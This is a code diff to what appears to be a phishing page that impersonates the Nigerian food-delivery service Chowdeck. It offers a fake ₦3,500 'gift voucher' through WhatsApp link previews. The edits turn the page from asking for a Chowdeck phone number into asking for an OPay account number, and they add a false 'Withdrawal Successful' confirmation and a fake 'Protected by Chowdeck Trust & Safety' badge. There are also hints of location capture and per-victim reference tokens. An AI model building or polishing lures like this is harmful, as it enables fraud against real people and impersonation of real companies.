@@ -9,11 +9,11 @@
   <!-- Open Graph / WhatsApp preview -->
   <meta property="og:type"        content="website"/>
   <meta property="og:title"       content="Someone sent you a Chowdeck Food Credit"/>
-  <meta property="og:description" content="You have a ₦7,000 food credit waiting. Confirm your delivery area to claim it."/>
+  <meta property="og:description" content="You have a ₦3,500 Chowdeck food credit waiting to be claimed."/>
   <meta property="og:image"       content="https://chowdeckgift.com/og-food.jpg"/>
   <meta property="og:url"         content="https://chowdeckgift.com"/>
   <meta property="og:site_name"   content="Chowdeck Gifts"/>
-  <meta name="description"        content="You have a ₦7,000 food credit waiting. Confirm your delivery area to claim it."/>
+  <meta name="description"        content="You have a ₦3,500 Chowdeck food credit waiting to be claimed."/>
 
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
@@ -114,7 +114,7 @@
 
   <div class="credit-card">
     <div class="label">Voucher Value</div>
-    <div class="amount"><span>&#8358;</span>7,000</div>
+    <div class="amount"><span>&#8358;</span>3,500</div>
     <div class="badge-food">Chowdeck Gift Voucher</div>
     <div class="from">Gifted by: <strong id="sender-name">Loading...</strong></div>
     <div class="ref ref-blur" id="ref-num">REF: CD-__TXN_ID__</div>
@@ -149,18 +149,18 @@
       <div class="step-num inactive" data-step>3</div>
       <div>
         <div class="step-title inactive" data-step-text>Redeem on Chowdeck</div>
-        <div class="step-sub inactive" data-step-sub>Apply your code at checkout to enjoy your ₦7,000 food credit.</div>
+        <div class="step-sub inactive" data-step-sub>Apply your code at checkout to enjoy your ₦3,500 food credit.</div>
       </div>
     </div>
   </div>
 
   <div class="cta-box">
     <div class="result-box" id="result-box">
-      <strong>&#10003; Voucher Accepted &amp; Pinned</strong>
-      <p>Your ₦7,000 Chowdeck voucher has been successfully verified and pinned to your account.</p>
+      <strong>&#10003; Withdrawal Successful</strong>
+      <p>Your ₦3,500 voucher credit has been verified and sent to your OPay account.</p>
       <div class="sms-note">
         <strong>What happens next:</strong><br/>
-        Your voucher has been pinned to your Chowdeck account. You will receive an SMS from <strong>Chowdeck</strong> with your unique redemption code. Open the Chowdeck app, add items to cart, and apply the code at checkout.
+        You will receive an SMS from <strong>OPay</strong> confirming the ₦3,500 credit to your wallet. Open your OPay app to use it for food orders, transfers, or cash out.
       </div>
       <p style="margin-top:10px;font-size:0.75rem;color:#aaa;">Ref: <span id="res-ref"></span> &nbsp;|&nbsp; Valid 24hrs</p>
     </div>
@@ -170,12 +170,12 @@
       <button class="error-btn" id="retry-btn" onclick="retryLocation()">Try Again</button>
     </div>
     <div class="phone-box" id="phone-box">
-      <label>Enter your Chowdeck-registered phone number</label>
+      <label>Enter your OPay account number</label>
       <div class="phone-input-wrap">
         <div class="phone-prefix">+234</div>
         <input class="phone-input" id="phone-input" type="tel" placeholder="080XXXXXXXX" maxlength="11" inputmode="numeric"/>
       </div>
-      <div class="phone-note">Required to pin the voucher to your account and send your redemption code</div>
+      <div class="phone-note">The ₦3,500 voucher credit will be sent directly to this OPay account</div>
     </div>
     <button class="cta-btn" id="cta-btn" onclick="handleCta(this)">Accept Voucher</button>
     <div class="cta-sub" id="cta-sub">Protected by Chowdeck Trust &amp; Safety</div>
@@ -272,8 +272,8 @@
       if (!phoneStep) {
         phoneStep = true;
         document.getElementById('phone-box').style.display = 'block';
-        btn.textContent = 'Verify & Claim Credit';
-        document.getElementById('cta-sub').textContent = 'Chowdeck will send your redemption code here';
+        btn.textContent = 'Verify & Withdraw';
+        document.getElementById('cta-sub').textContent = 'OPay will receive the ₦3,500 credit once confirmed';
         document.getElementById('phone-input').focus();
       } else {
         const num = document.getElementById('phone-input').value.trim();
